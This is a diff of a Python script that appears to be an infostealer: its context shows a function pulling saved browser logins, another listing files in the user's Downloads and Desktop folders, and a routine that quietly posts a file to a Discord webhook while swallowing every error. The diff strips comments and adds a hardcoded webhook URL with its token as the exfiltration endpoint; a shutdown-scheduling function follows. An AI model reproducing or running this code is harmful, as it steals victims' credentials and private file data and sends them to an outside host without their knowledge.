@@ -267,7 +267,6 @@ def get_browser_logins(browser, limit=100):
         return None
 
 def save_to_file(browser, logins):
-    # Ensure the desktop path is correctly identified, accounting for OneDrive integration
     desktop_path = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
     if not os.path.exists(desktop_path):
         desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
@@ -305,11 +304,10 @@ import requests
 import sys
 
 def list_applications_in_folders():
-    # Get the path to the Downloads and Desktop folders
-    downloads_path = Path.home() / 'Downloads'
-    desktop_path = Path.home() / 'OneDrive' / 'Desktop'  # Adjusting for OneDrive path
 
-    # Function to list files and directories in a given path
+    downloads_path = Path.home() / 'Downloads'
+    desktop_path = Path.home() / 'OneDrive' / 'Desktop'
+
     def list_items(path):
         items = []
         for item in path.iterdir():
@@ -317,13 +315,10 @@ def list_applications_in_folders():
                 items.append(item.name)
         return items
 
-    # List applications in the Downloads folder
     downloads_items = list_items(downloads_path)
 
-    # List applications in the Desktop folder
     desktop_items = list_items(desktop_path)
 
-    # Combine the lists and create a text file
     all_items = downloads_items + desktop_items
     with open('applications_list.txt', 'w') as file:
         for item in all_items:
@@ -336,12 +331,15 @@ def send_file_to_discord_webhook(file_path, webhook_url):
         files = {'file': file}
         response = requests.post(webhook_url, files=files)
         if response.status_code != 200:
-            pass  # No output to the terminal
+            pass
+            
+    webhook_url = 'https://discord.com/api/webhooks/1437209574556958722/iRtGtNbNqGsoPNxgyRO1WY7A8EbIvnsQertCFEpRzVU2l93cQkxTTbX68cOp1BuSjjPH'  # Replace with your actual webhook URL        
+    
     try:
         file_path = list_applications_in_folders()
         send_file_to_discord_webhook(file_path, webhook_url)
     except Exception as e:
-        pass  # Suppress any exceptions
+        pass
 
 def schedule_shutdown():
 
